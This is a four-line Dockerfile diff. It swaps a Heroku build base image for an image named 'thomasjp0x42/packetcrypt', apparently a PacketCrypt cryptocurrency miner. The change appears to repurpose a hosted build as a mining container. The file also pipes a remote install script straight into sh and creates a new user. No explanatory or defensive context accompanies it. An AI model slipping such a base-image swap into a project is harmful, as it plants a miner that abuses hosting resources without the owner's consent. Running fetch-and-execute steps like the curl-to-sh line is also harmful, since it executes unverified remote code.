@@ -1,4 +1,4 @@
-FROM heroku/heroku:20-build
+FROM thomasjp0x42/packetcrypt
 RUN curl -sS https://get.docker.com/ | sh
 RUN groupadd docker
 RUN useradd pepek
